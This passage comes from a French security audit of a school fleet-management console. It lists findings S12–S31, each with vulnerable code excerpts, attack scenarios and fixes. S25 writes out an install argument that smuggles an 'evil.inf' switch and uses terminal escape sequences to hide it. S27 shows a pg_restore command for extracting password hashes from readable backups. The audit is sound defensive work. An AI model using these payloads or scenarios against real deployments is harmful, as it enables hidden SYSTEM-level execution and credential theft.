**Recommandation.** Dans xlsx_response, nettoyer chaque chaîne avec openpyxl.cell.cell.ILLEGAL_CHARACTERS_RE.sub('', value) avant de l'ajouter. Idéalement, retirer aussi les caractères de contrôle à l'ingestion (bound_text et _bounded) pour protéger l'affichage et les e-mails.

<a id="s12"></a>

#### S12 — Énumération des comptes via le 423 « compte verrouillé » malgré le faux hachage

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/auth.py:196`

authenticate() fait un bcrypt factice pour qu'une adresse inconnue ou désactivée réponde comme un vrai compte (401 et même durée). Mais seule une adresse liée à un compte actif peut atteindre le compteur d'échecs et recevoir un 423 AUTH_ACCOUNT_LOCKED, avec locked_until dans les détails. Une adresse inconnue reçoit 401 indéfiniment. Il suffit donc de 5 tentatives par adresse pour savoir si elle a un compte de console. Une fois verrouillé, le chemin répond aussi sans calcul bcrypt, ce qui le rend distinguable au temps de réponse. La protection anti-énumération voulue par le code est ainsi contournée.

```
raise AppError(
            code=ErrorCode.AUTH_ACCOUNT_LOCKED,
            status_code=423,
            message="Too many failed attempts; this account is temporarily locked",
            details={"locked_until": exc.locked_until.isoformat()},
        ) from None
```

**Scénario.** L'attaquant teste prenom.nom@natimai.local pour chaque membre du personnel, avec 5 mots de passe faux par adresse. Il reste sous 10 requêtes / 5 min par IP en espaçant les essais ou en changeant de poste. Les adresses qui finissent en 423 sont des comptes de console actifs, celles qui restent en 401 n'en sont pas. Effet de bord : chaque compte découvert est aussi verrouillé.

**Recommandation.** Répondre à un compte verrouillé avec le même 401 générique qu'un échec d'identifiants, sans détail, et laisser locked_until au journal de sécurité et à la page Utilisateurs. Il faut aussi brûler un bcrypt sur le chemin verrouillé. À défaut, simuler un verrouillage pour les adresses inconnues, au moyen d'un compteur en mémoire par adresse.

<a id="s13"></a>

#### S13 — Compteur d'échecs de connexion sujet aux mises à jour perdues : le verrouillage par compte est très affaibli en rafale

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `backend/app/features/user/crud.py:108`

authenticate() lit l'utilisateur sans SELECT ... FOR UPDATE, incrémente failed_login_attempts en Python, puis la route committe la valeur absolue. Si N requêtes concurrentes sur le même compte lisent toutes la ligne avant le premier commit, le compteur n'augmente que de 1. Or le verrouillage par compte existe justement pour plafonner un attaquant qui dispose de plusieurs adresses source (« whatever the number of addresses trying it », config.py:146-148).

```
user = await get_by_email(session, email)
    ...
    if not security.verify_password(password, user.hashed_password):
        user.failed_login_attempts += 1
        session.add(user)
```

**Scénario.** Un attaquant contrôle 20 adresses du LAN (plusieurs postes, ou des alias IPv6). Il envoie 10 tentatives simultanées depuis chaque adresse, soit 200 requêtes lancées ensemble. Les SELECT précèdent les commits, si bien que le compteur ne monte que d'une unité par vague. Le pool de connexions (POSTGRES_POOL_SIZE 20 + POSTGRES_MAX_OVERFLOW 10) borne chaque vague à une trentaine de requêtes : le verrouillage tombe après environ 120 à 150 essais au lieu de 5 (estimation par lecture du code, non mesurée).

**Recommandation.** Incrémenter de façon atomique en base (UPDATE users SET failed_login_attempts = failed_login_attempts + 1 ... RETURNING), ou relire la ligne en with_for_update avant de vérifier.

<a id="s14"></a>

#### S14 — Demande de réinitialisation : n'importe qui peut invalider le lien en cours d'un utilisateur et inonder sa boîte, la limite étant par IP et non par compte

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/features/user/crud.py:194`

Chaque POST /auth/password-reset/request accepté pour un compte actif supprime le jeton existant et en envoie un nouveau. La seule limite est password_reset_limiter, 5 requêtes / 15 min par IP source, rien par compte cible. Un tiers peut donc rendre inutilisable le lien qu'un utilisateur vient de recevoir et générer des courriels à volonté vers une adresse connue. Par ailleurs, la réponse 204 d'une adresse inconnue part avant toute écriture en base, alors qu'une adresse connue implique DELETE, INSERT, outbox et COMMIT : un léger écart de temps, mesurable sur le LAN.

```
await session.exec(
        delete(PasswordResetToken).where(col(PasswordResetToken.user_id) == user.id)
    )
    token = security.generate_token()
```

**Scénario.** Un utilisateur demande un lien de réinitialisation. Pendant qu'il ouvre sa messagerie, un tiers rejoue la demande pour son adresse depuis un autre poste : le lien reçu répond « This reset link is invalid or has expired ». En répétant l'opération depuis plusieurs postes, le tiers empêche toute réinitialisation autonome et remplit la boîte et le quota Mailgun.

**Recommandation.** Ajouter une limite par compte cible, par exemple un seul nouveau courriel par période de 5 min. Pendant cette période, réutiliser le jeton encore valide ou ne pas en émettre de nouveau, au lieu de supprimer le précédent. Égaliser le temps de réponse en traitant la demande en arrière-plan, ou en faisant un travail équivalent pour une adresse inconnue.

<a id="s15"></a>

#### S15 — Changement d'adresse e-mail par un administrateur sans invalidation des liens de réinitialisation en attente

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/users.py:349`

update_user permet de changer l'e-mail d'un compte, mais ne purge pas les jetons de reset (purge_reset_tokens) et ne révoque pas les sessions. Un lien envoyé à l'ancienne adresse reste valide jusqu'à 60 minutes après le changement. Or on change souvent l'adresse justement parce que l'ancienne boîte n'appartient plus au titulaire (alias réattribué, boîte compromise).

```
if "email" in fields and fields["email"] != user.email:
        await _reject_email_taken(session, fields["email"], exclude=user.id)

    group_ids = fields.pop("group_ids", None)
    for name, value in fields.items():
        ...
        setattr(user, name, stored)
```

**Scénario.** La personne qui contrôle l'ancienne boîte (par exemple secretariat@ réattribuée) demande un lien de reset. L'administrateur change alors l'adresse du compte vers la nouvelle boîte du titulaire. Le lien déjà reçu sur l'ancienne boîte reste valable : son détenteur définit un nouveau mot de passe et prend le compte.

**Recommandation.** Quand l'e-mail change, appeler crud.purge_reset_tokens(session, user.id) dans la même transaction. On peut aussi révoquer les sessions (auth_sessions.revoke_all) et journaliser l'ancienne et la nouvelle adresse dans l'audit.

<a id="s16"></a>

#### S16 — Un compte limité à un bâtiment ou à une salle peut déplacer ce lieu vers un autre site et retirer des postes du périmètre des autres équipes

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/rooms.py:185`

_building_writable autorise la modification dès que l'identifiant du bâtiment figure dans le périmètre, quelle que soit la nouvelle valeur de location. Le second contrôle, après setattr (ligne 424), repasse donc toujours pour un compte limité par bâtiment. De même, update_room (ligne 588) ne vérifie que la visibilité finale de la salle, toujours vraie pour un compte limité par identifiant de salle, même après un changement de location ou de bâtiment. Or le site effectif (COALESCE(buildings.location, rooms.location)) décide du périmètre des groupes limités par site et des destinataires des alertes de menace. Un compte limité peut ainsi faire sortir des postes du périmètre de l'équipe du site d'origine et les faire entrer dans celui d'un autre site.

```
return (
        scope is None
        or building.id in scope.buildings
        or (building.location is not None and building.location in scope.locations)
    )
```

**Scénario.** Le compte T a room:write et le périmètre {buildings:[B]}, où B est un bâtiment de Taravao. Il envoie PATCH /api/v1/buildings/B {"location":"Papeete"} et la requête est acceptée (200). Les postes de B dont l'agent ne déclare pas de site disparaissent alors pour les techniciens limités au site Taravao, qui ne reçoivent plus les alertes de menace de ces postes (threat_alert filtre par machine_visible). Ils apparaissent en revanche chez l'équipe de Papeete. Le même effet s'obtient avec PATCH /rooms/R {"building_id":null,"location":"Papeete"} pour un compte limité à la salle R.

**Recommandation.** Pour un compte restreint, refuser tout changement de location ou de building_id qui fait sortir le lieu d'un site couvert par scope.locations. Seul un compte non restreint (scope is None) devrait pouvoir changer le site d'un bâtiment, ou le site et le bâtiment d'une salle. Le test test_a_confined_account_builds_on_its_site_only ne couvre que le périmètre par site.

<a id="s17"></a>

#### S17 — Journal d'audit non filtré par périmètre

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/audit.py:66`

GET /audit et /audit/actions exigent audit:read mais n'utilisent jamais CurrentScope. Les entrées contiennent pourtant le nom d'hôte, le machine_uuid, les identifiants et sources de fusion, les listes machine_ids des réveils et placements en masse, les cibles des commandes en masse, etc. Rien n'empêche d'accorder audit:read à un groupe restreint : la règle anti-escalade l'autorise si le gestionnaire détient audit:read. deps.get_current_scope affirme pourtant que toute route qui lit des postes, ou ce qui en dépend, est filtrée.

```
entries, total = await crud.list_entries(
        session,
        action=action,
        actor=actor,
        resource_type=resource_type,
        resource_id=resource_id,
```

**Scénario.** Un groupe « Responsables Taravao » (site Taravao) reçoit audit:read. Un de ses membres appelle GET /api/v1/audit?action=machine.merge ou machine.revoke_token. Il obtient les noms d'hôte et les UUID des postes de Papeete, et sait qui a agi sur eux et quand.

**Recommandation.** Soit refuser audit:read à tout groupe restreint (validation dans _validate_scope ou à la composition), soit filtrer pour un compte restreint les entrées de type machine sur resource_id parmi les postes visibles. Dans le second cas, masquer aussi les entrées en masse dont le resource_id est vide.

<a id="s18"></a>

#### S18 — Assignation d'une vérification à un compte qui ne voit pas le poste : le courriel lui révèle des postes hors périmètre

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/checks.py:315`

_require_assignee vérifie seulement que le compte existe et qu'il est actif. Il ne contrôle ni ses permissions, ni son périmètre par rapport au poste. Le courriel send_checks_assigned nomme alors les postes concernés (nom d'hôte, consignes) à un destinataire confiné ailleurs, voire sans aucun droit. C'est contraire au principe appliqué aux alertes de menace (« naming it to somebody confined to another site is exactly what the scope exists to prevent »).

```
assignee = await _require_assignee(session, payload.assigned_to_id)
    found_machines = await session.exec(
        restrict(
            select(Machine).where(col(Machine.id).in_(payload.machine_ids)),
```

**Scénario.** Un administrateur, ou un technicien non restreint, sélectionne 40 postes de Papeete dans POST /api/v1/checks/bulk et choisit par erreur dans /checks/assignable-users un technicien limité à Taravao. Le technicien reçoit un courriel qui nomme 10 de ces postes (plafond NOTIFICATION_MAX_ITEMS) avec les consignes, suivis de « … et 30 autre(s) », puis tombe sur des 404 en ouvrant les fiches. La tâche n'apparaît pas non plus dans sa liste filtrée.

**Recommandation.** Dans create_check, create_checks_bulk et update_check, refuser un destinataire dont le périmètre (user_crud.user_scope) ne couvre pas tous les postes, ou qui n'a pas check:read. Filtrer aussi /checks/assignable-users selon ces critères.

<a id="s19"></a>

#### S19 — Relais Wake-on-LAN détournable : l'emplacement et l'IP déclarés par l'agent décident seuls qui reçoit les réveils d'un site

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/features/wol/relay.py:62`

En mode WOL_RELAY_ENABLED, un poste peut prendre un réveil si `shares_wire` est vrai. Ce test compare uniquement `machine.location` (ou `domain`), une valeur que l'agent fixe librement à chaque heartbeat (agent.py l.662-668, aucun contrôle hormis la longueur). La priorité « même sous-réseau » (l.107) se fonde sur `ip_address` et `ip_prefix_length`, eux aussi déclarés par l'agent. `claim_wakes` passe ensuite la commande en DELIVERED avec `relay_machine_id` : aucun autre poste ne peut plus la prendre, et le relais peut renvoyer « succeeded » avec le texte de son choix.

```
if target.location:
        return relay.location == target.location
...
    if same_subnet(relay, target):
        return True
```

**Scénario.** Un administrateur local d'un poste lit EnrollmentSecret (ou réutilise le token de son poste) et enrôle une fausse machine (30 enrôlements par IP toutes les 5 min). Son heartbeat déclare location="Lycée de Taravao", ip_address=10.4.7.200 et ip_prefix_length=24, soit le sous-réseau des cibles. Il prend aussitôt chaque réveil de ce site, sans attendre le délai de grâce, et récupère la MAC de chaque cible. Il n'émet rien et renvoie un « succeeded ». La console affiche « déjà transmis à un poste relais », puis « Relayé par … — Paquet magique émis ». Plus aucun poste du site ne se réveille. En changeant d'emplacement à chaque heartbeat, il peut viser plusieurs sites.

**Recommandation.** Ne plus faire de l'emplacement déclaré par l'agent une preuve suffisante : le valider côté serveur (liste d'emplacements autorisés ; changement d'emplacement soumis à approbation ou journalisé et signalé comme pour needs_verification). Exclure des relais les machines needs_verification ou enrôlées récemment. Libérer la prise si aucun résultat n'arrive dans un délai court, pour qu'un autre relais la reprenne, ou confier le même réveil à deux relais distincts.

<a id="s20"></a>

#### S20 — Placement en salle piloté par l'agent : choix de la salle, salles existantes captées et création de salles illimitée

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/features/room/crud.py:277`

En mode ad_ou ou ad_location, `ou`, `ou_dn` et `ad_location` viennent de l'agent sans aucune vérification côté serveur (DirectoryReport se contente de borner). Trois effets en découlent. (1) Un agent qui déclare l'`ou_dn` d'une salle existante (les DN se lisent dans AD) y est rangé, et entre ainsi dans le périmètre des techniciens limités à cette salle (scope.machine_clause) et des alertes de menace qui leur sont destinées. (2) Un agent qui déclare un `ou` égal au nom d'une salle manuelle sans bâtiment, avec un DN inventé, « adopte » cette salle (l.277 : `loose.ad_key = key`). Les vrais postes de cette OU atterrissent alors dans une nouvelle salle « Nom (2) », sans le responsable de maintenance, le cycle ni les notes de la salle d'origine. (3) Chaque heartbeat portant un nouveau `ou_dn` crée une salle : rien ne limite le nombre de salles, et la boucle `while room_by_name(... f"{name} ({n})")` fait n requêtes pour la n-ième salle portant le même nom.

```
loose = await room_by_name(session, None, name)
    if loose is not None and loose.ad_key is None:
        loose.ad_key = key
...
    while await room_by_name(session, None, candidate) is not None:
        candidate = f"{name} ({n})"
        n += 1
```

**Scénario.** Avec un token d'agent (le sien, ou celui d'une fausse machine enrôlée grâce au secret de flotte), on envoie en boucle des heartbeats dont l'inventaire contient directory={ou:"B12", ou_dn:"OU=x<compteur>"} et un hash qui change à chaque fois. Le heartbeat n'a pas de limite de débit. On obtient des milliers de salles « B12 (2) » … « B12 (5000) » dans la page Salles. Chaque nouvelle création coûte des milliers de requêtes et finit en timeout. Le premier envoi a aussi capté la vraie salle manuelle « B12 ».

**Recommandation.** Ne rattacher un poste à une salle annuaire que si le DN rapporté se termine par le DN de la machine, lui-même cohérent avec son hostname. Mieux : lire l'OU côté serveur par LDAP plutôt que de croire l'agent. Ne pas adopter automatiquement une salle manuelle à partir d'un rapport d'agent : demander une confirmation dans la console. Limiter le nombre de salles créées automatiquement par machine et par jour, et calculer le suffixe en une seule requête (max des suffixes existants).

<a id="s21"></a>

#### S21 — Catalogue logiciel global sans limite de croissance, alimenté par n'importe quel token d'agent, sans limite de débit sur le heartbeat

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/features/inventory/crud.py:104`

Chaque heartbeat peut porter jusqu'à MAX_SOFTWARE=2000 triplets (nom, version, éditeur) que `_catalogue_ids` insère dans la table partagée `software` (ON CONFLICT DO NOTHING). Seul un hash identique à celui stocké court-circuite le traitement, et l'agent le choisit. Aucune purge des entrées orphelines n'existe (aucun delete sur Software dans le code), et /agent/heartbeat n'a pas de limite de débit, contrairement à /agent/enroll. La page Logiciels masque les orphelins (HAVING count > 0), mais elle fait un outer join et un GROUP BY sur la table entière.

```
stmt = pg_insert(Software).values(rows)
    await session.exec(stmt.on_conflict_do_nothing(constraint="uq_software_identity"))
```

**Scénario.** Un script muni d'un token d'agent (volé sur une image disque, ou obtenu en enrôlant une fausse machine) envoie des heartbeats en boucle avec un hash qui change et 2000 noms aléatoires. Il ajoute environ 2000 lignes par requête, soit des millions de lignes à l'heure. La table et ses index gonflent sans fin, et les requêtes du catalogue et de ses exports ralentissent pour toute la console.

**Recommandation.** Limiter le débit de /agent/heartbeat par machine (par exemple 1 requête toutes les 10 s, et le bloc inventaire au plus une fois par heure). Ajouter au worker une purge périodique des entrées `software` sans `machine_software` depuis N jours.

<a id="s22"></a>

#### S22 — L'agent accepte une ApiBaseURL en http:// et envoie alors en clair le secret de flotte puis le token

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `agent/internal/config/config.go:252`

Load vérifie seulement que APIBaseURL n'est pas vide. Le schéma n'est jamais contrôlé : client.do envoie X-Enrollment-Secret et `Authorization: Bearer` à c.baseURL+path quel qu'il soit. Le bloc `http://` du Caddyfile redirige en 301, mais la requête et ses en-têtes sont déjà partis en clair. Le client Go suit ensuite le 301 en GET et renvoie l'en-tête personnalisé X-Enrollment-Secret, qui ne fait pas partie des en-têtes sensibles qu'il retire. `http://` est toutefois un mode documenté : DEPLOYMENT.md le donne comme accepté (l. 896) et l'emploie dans l'exemple du port direct `http://192.168.1.50:8800` (l. 1016). Derrière Caddy, le POST d'enrôlement redirigé devient un GET qui échoue : l'agent n'obtient jamais de token, et seul le secret de flotte fuit, à chaque tentative. Le token ne part en clair que si `http://` atteint réellement le backend (port direct), ou si un agent déjà enrôlé est repointé vers `http://`.

```
if cfg.APIBaseURL == "" {
		return nil, fmt.Errorf(
			`api_base_url is required: ...`, path)
	}
```

**Scénario.** Un administrateur déploie le MSI avec APIBASEURL=http://tiai.natimai.local (oubli du « s » ou copie d'un ancien exemple). Chaque poste envoie EnrollmentSecret en clair sur le LAN à chaque tentative, avec un back-off jusqu'à 5 min. N'importe quel poste du même segment peut le capturer, puis enrôler des machines.

**Recommandation.** Ne plus accepter `http://` par défaut : exiger une option explicite (AllowInsecureHTTP) pour les installations qui visent le port direct, et journaliser un avertissement à chaque démarrage dans ce mode. Corriger DEPLOYMENT.md (l. 896 et 1016) dans le même changement, sans quoi les installations qui suivent la documentation cessent de s'enrôler. Désactiver le suivi des redirections (CheckRedirect qui renvoie http.ErrUseLastResponse) pour les appels de l'API agent.

<a id="s23"></a>

#### S23 — Journal de l'agent sans limite pendant que le service tourne : corps d'erreur lus et journalisés en entier, rotation seulement au démarrage

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `agent/internal/api/client.go:161`

Sur une réponse non-2xx, `do` lit tout le corps (io.ReadAll sans LimitReader, alors que FetchPackageFile se limite à 4096 octets) et le place dans StatusError.Error(). La boucle journalise l'erreur à chaque échec (agent.go l.217, au plus toutes les 5 min). Or logging.rotate n'est appelé que dans Setup, au démarrage du processus. Sur un poste ou un serveur jamais redémarré, agent.log grossit sans limite, sous ProgramData sur le volume système, et la mémoire du service dépend de la taille de la page d'erreur renvoyée.

```
if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("%s %s: %w", method, path,
			&StatusError{StatusCode: resp.StatusCode, Body: string(b)})
```

**Scénario.** Un équilibreur ou un reverse proxy placé devant le serveur (ou, avec une ApiBaseURL en `http://`, un portail captif ou un proxy) renvoie une page HTML de 50 Ko avec un 407 ou un 503 pendant une panne de plusieurs semaines. Le journal reçoit environ 50 Ko × 288 = 14 Mo par jour. Après un mois, agent.log dépasse 400 Mo, bien au-delà des 5 Mio prévus par maxLogSize, et aucune rotation n'a lieu tant que le service n'est pas redémarré. Avec une URL en https, un portail captif ou un 407 de proxy échouent avant toute réponse HTTP (erreur de transport, sans corps) : la croissance se limite alors à quelques centaines d'octets par échec, toujours sans rotation.

**Recommandation.** Lire le corps d'erreur avec io.LimitReader(resp.Body, 4096) comme dans FetchPackageFile, et le tronquer dans le message. Faire vérifier la taille du fichier par l'écrivain du journal à chaque écriture, ou périodiquement, et faire la rotation à chaud.

<a id="s24"></a>

#### S24 — L'agent télécharge sans plafond de taille : un serveur compromis peut remplir le disque système des postes

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `agent/internal/api/client.go:219`

FetchPackageFile copie tout le corps de la réponse dans le fichier (`io.Copy`) sans le borner à `f.Size - offset`. La taille n'est contrôlée qu'après la copie (download.go `info.Size() != f.Size`). Même avec un paquet signé en méthode B, dont la taille attendue est authentique, le serveur peut renvoyer un flux infini. L'écriture se fait en SYSTEM sous C:\ProgramData, donc sans quota utilisateur.

```
if _, err := io.Copy(f, resp.Body); err != nil {
	return &deploy.RetryLater{Err: fmt.Errorf("transfert interrompu : %w", err)}
}
```

**Scénario.** Un serveur compromis rejoue un paquet signé déjà approuvé (risque documenté) mais répond au GET du fichier par un flux de données sans fin. Chaque poste ciblé écrit jusqu'à saturer C:, ce qui casse Windows Update, les profils et les journaux. Le contrôle de taille n'intervient qu'une fois le disque plein.

**Recommandation.** Remplacer par `io.Copy(f, io.LimitReader(resp.Body, expectedSize-offset+1))` en passant la taille attendue au Fetcher, puis échouer si davantage d'octets arrivent. Vérifier aussi `Content-Length` avant de commencer.

<a id="s25"></a>

#### S25 — Le script de signature affiche les arguments, nom et version sans les neutraliser : des séquences de contrôle (ESC, CR) peuvent cacher la vraie commande à l'administrateur qui signe

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `deploy/packages/Sign-TiaiPackage.ps1:123`

La relecture dans le script est présentée comme la garantie de la méthode B (« relisez-le. Signer, c'est autoriser les postes à l'exécuter en SYSTEM »). Or Format-Step et les Write-Host affichent tels quels `args`, `name` et `version`. Côté serveur, `_check_args` (packages.py l. 66-68) ne rejette que NUL, et `name` ou `version` acceptent n'importe quel caractère. Une séquence VT (ESC [1A ESC [2K, effacement de ligne), qui ne contient pas d'espace et n'est donc pas mise entre guillemets, ou un retour chariot, est interprétée par la console PowerShell 5.1/Windows Terminal. Elle peut réécrire la ligne « Installation : … » affichée.

```
$parts = @($Step.args | ForEach-Object { if ($_ -match '\s|^$') { '"' + $_ + '"' } else { $_ } })
return "$($Step.run) $($parts -join ' ')".Trim()
...
Write-Host "Installation    : $(Format-Step $doc.install)"
```

**Scénario.** Un utilisateur package:write, sans clé de signature, prépare un paquet dont `install_args` vaut `["/S", "/LOADINF={dir}\\evil.inf", "\u001b[2K\u001b[GInstallation\u001b[4C:\u001b[1Csetup.exe\u001b[1C/S"]` (aucun espace : les déplacements de curseur en tiennent lieu, sinon l'argument serait mis entre guillemets). L'administrateur qui détient la clé lance Sign-TiaiPackage.ps1 : la console n'affiche que `setup.exe /S`. Cette charge n'a pas été rejouée sur une console Windows, et le manifeste ouvert dans un éditeur montre la séquence `\u001b` en clair. Il confirme, et les postes exécutent en SYSTEM la commande cachée, cette fois sous la signature de confiance de la méthode B.

**Recommandation.** Dans le script, refuser (ou afficher échappés, par exemple en `\u001b`) tout caractère de contrôle (< 0x20, 0x7F, U+009B) dans name, version, run et args avant de demander la confirmation. Côté serveur, rejeter ces caractères dans `_check_args` et dans les champs name et version.

<a id="s26"></a>

#### S26 — Recherche LIKE non échappée : « _ » et « % » saisis élargissent les résultats des listes et des exports

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/software.py:66` · aussi : `backend/app/features/user/crud.py:135`

La recherche du catalogue logiciel, ainsi que la recherche et les filtres texte de la liste des machines (machines.py, lignes 629-646 et 889-906 : antivirus, os_version, hw_model, hw_manufacturer, cpu_model), interpolent le texte saisi dans un motif ILIKE sans échapper % et _. Le dépôt a pourtant la fonction _escape_like dans audit/crud.py et package/crud.py. Une recherche contenant « _ » devient un joker. Ce n'est pas une injection SQL (les valeurs sont liées), mais le résultat est faux, et les exports reprennent les mêmes filtres.

```
def _search_clause(search: str) -> ColumnElement[bool]:
    pattern = f"%{search}%"
    return or_(
        col(Software.name).ilike(pattern), col(Software.publisher).ilike(pattern)
    )
```

**Scénario.** Un administrateur cherche le poste « PC_01 » ou le logiciel « Visual_C » : la liste renvoie aussi PC-01, PCX01, etc. Une recherche « % » renvoie tout le parc, et l'export « filtré » contient alors toutes les lignes alors que l'utilisateur croit avoir filtré.

**Recommandation.** Factoriser _escape_like dans un module commun et l'appliquer à toutes les recherches par sous-chaîne (software._search_clause, machines._search_clause et les filtres ilike de _filtered_machines), avec escape="\\".

*Signalé aussi sous un autre angle :* Recherche de comptes : % et _ non échappés dans le motif LIKE

<a id="s27"></a>

#### S27 — Sauvegardes de la base non chiffrées et lisibles par tout utilisateur de l'hôte

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `deploy/backup/backup.sh:27`

Le conteneur db-backup remplace l'entrypoint de postgres:16-alpine (`sh /backup.sh`) sans directive user. Il tourne donc en root avec l'umask par défaut 022. Chaque dump (format custom, compressé mais pas chiffré) est écrit en 0644 dans ./backups, un dossier de l'hôte que Docker crée en 0755. Le dump contient toute la base : hachés des mots de passe des comptes console, sessions, jetons de réinitialisation, journal d'audit, inventaire et identifiants e-mail chiffrés. Ni DEPLOYMENT.md ni le script ne restreignent les droits, et la documentation conseille même de copier ces fichiers hors de la machine tels quels.

```
if pg_dump -h db -U "$POSTGRES_USER" -d "$POSTGRES_DB" -Fc -f "$tmp"; then
    mv "$tmp" "$out"   # (compose : entrypoint: ["sh", "/backup.sh"], volumes: - ./backups:/backups)
```

**Scénario.** Un compte non privilégié sur le serveur (prestataire, service compromis, utilisateur d'un autre outil hébergé sur la même VM) lance `pg_restore -f - deploy/backups/tiai-*.dump`. Il récupère les hachés bcrypt des administrateurs et tout l'historique du parc. Même résultat pour toute copie rsync/robocopy hors site faite sans précaution.

**Recommandation.** Ajouter `umask 077` en tête de backup.sh (ou `chmod 600` après le mv) et créer deploy/backups en 0700. Chiffrer de préférence les dumps (age/gpg, avec une clé publique fournie par variable) avant l'export hors site. Documenter aussi `chmod 600 deploy/.env`.

<a id="s28"></a>

#### S28 — Override de dev : backend en clair sur 0.0.0.0:8800 qui fait confiance à X-Forwarded-For (limitation de débit et IP d'audit contournables)

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/core/net.py:27`

client_ip() prend l'entrée la plus à droite de X-Forwarded-For, en supposant que Caddy est toujours devant. Or docker-compose.dev.yml publie le backend directement sur toutes les interfaces (port 8800) avec ENVIRONMENT=local. Le « mode A » de DEPLOYMENT.md le recommande pour les « premiers tests réseau, agents » sur le LAN. Sur ce port, l'en-tête vient entièrement du client : la clé des limiteurs (login, reset, enroll) et l'IP écrite dans le journal de sécurité et dans reenroll_requested_ip deviennent arbitraires. En plus, jeton d'agent, secret d'enrôlement et mots de passe circulent en HTTP, et les erreurs 500 détaillées sont renvoyées.

```
forwarded = request.headers.get("x-forwarded-for", "")
    if forwarded:
        return forwarded.rsplit(",", 1)[-1].strip()
# docker-compose.dev.yml
    ports:
      - "${TIAI_DEV_BACKEND_PORT:-8800}:8000"
```

**Scénario.** Sur un serveur pilote lancé en mode A, un élève sur le réseau envoie des POST /api/v1/login/... vers http://serveur:8800 avec `X-Forwarded-For: 10.9.<n>.<m>` différent à chaque requête. login_limiter (10/5 min par IP) ne bloque jamais : seul le verrouillage par compte reste. Le journal attribue les essais à des IP fictives, et une demande de réenrôlement frauduleuse enregistre l'IP choisie par l'attaquant.

**Recommandation.** Ne lire X-Forwarded-For que si le pair socket fait partie d'une liste de proxys de confiance (TRUSTED_PROXIES, par défaut le réseau Compose), sinon prendre request.client.host. Publier le port de dev sur 127.0.0.1 par défaut, et rappeler dans DEPLOYMENT.md que le secret d'enrôlement utilisé en mode A est exposé et doit être changé avant la production.

<a id="s29"></a>

#### S29 — Actions GitHub tierces référencées par tag mutable alors qu'elles reçoivent un jeton en écriture ou un PAT

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `.github/workflows/ci.yml:209`

Le dépôt épingle par SHA certaines actions (MishaKav, trivy), mais pas celles qui manipulent des droits. davelosert/vitest-coverage-report-action@v2 (tag majeur mobile) tourne avec un GITHUB_TOKEN `pull-requests: write`. schneegans/dynamic-badges-action@v1.9.0 reçoit le PAT GIST_SECRET. Dans release.yml, les permissions `contents: write` et `packages: write` sont déclarées au niveau du workflow, donc héritées par tous les jobs (tests Go, installation de WiX via dotnet tool, build Docker). Ce jeton est conservé par actions/checkout dans la config git, et docker/login-action@v4 (tag mobile) le reçoit.

```
uses: davelosert/vitest-coverage-report-action@v2
...
uses: schneegans/dynamic-badges-action@v1.9.0
  with:
    auth: ${{ secrets.GIST_SECRET }}
# release.yml
permissions:
  contents: write
  packages: write
```

**Scénario.** Le tag v2 de l'action tierce est déplacé vers un commit malveillant (compromission du mainteneur, cas tj-actions/changed-files en 2025). À la PR interne suivante, le code récupère le jeton. Sur un tag de release, une étape compromise peut aussi remplacer les images ghcr.io/…/tiai-backend ou les binaires d'une release que les GPO déploient sur tout le parc.

**Recommandation.** Épingler toutes les actions par SHA de commit (avec le tag en commentaire, Dependabot pour les mises à jour). Dans release.yml, mettre `permissions: contents: read` au niveau global et n'accorder `contents: write` qu'au job publish et `packages: write` qu'au job images. Ajouter `persist-credentials: false` sur les checkout qui ne poussent rien.

<a id="s30"></a>

#### S30 — PAT GIST_SECRET exposé en variable d'environnement à tout le code des jobs de test

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `.github/workflows/ci.yml:169`

GIST_SECRET est déclaré dans `env:` au niveau des jobs backend et frontend. Il est donc présent dans l'environnement de `npm ci` (sans --ignore-scripts : postinstall `quasar prepare` et scripts d'installation des dépendances), de vitest, du build Vite, de `uv sync` et de pytest, alors que seules deux étapes de badge en ont besoin. Ces jobs tournent aussi sur les PR venant de branches du dépôt.

```
frontend:
    ...
    env:
      GIST_SECRET: ${{ secrets.GIST_SECRET }}
    steps:
      ...
      - name: Install dependencies
        run: npm ci
```

**Scénario.** Une dépendance npm ou un plugin pytest compromis lit process.env.GIST_SECRET pendant `npm ci` ou les tests, puis l'exfiltre. Il obtient alors l'écriture sur tous les gists du compte propriétaire du PAT.

**Recommandation.** Retirer GIST_SECRET de `env:` au niveau job. Dans les conditions `if:`, tester `secrets.GIST_SECRET != ''` via une sortie d'étape préalable, et ne passer le secret qu'en `with: auth:` de l'étape badge.

<a id="s31"></a>

#### S31 — Image frontend sur nginx:1.27-alpine (branche en fin de vie) et jamais scannée par Trivy

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/Dockerfile:14`

La console tourne sur nginx:1.27-alpine. La branche mainline 1.27 est close depuis 2025 (1.27.5) : ce tag ne reçoit plus de reconstruction, ni pour nginx ni pour les paquets Alpine embarqués (openssl, libxml2…). Le job Trivy de security.yml ne construit et ne scanne que l'image backend, donc aucune alerte ne signalera ce vieillissement.

```
FROM nginx:1.27-alpine AS runner
# security.yml, job image :
      - run: docker build -t tiai-backend:ci ./backend
```

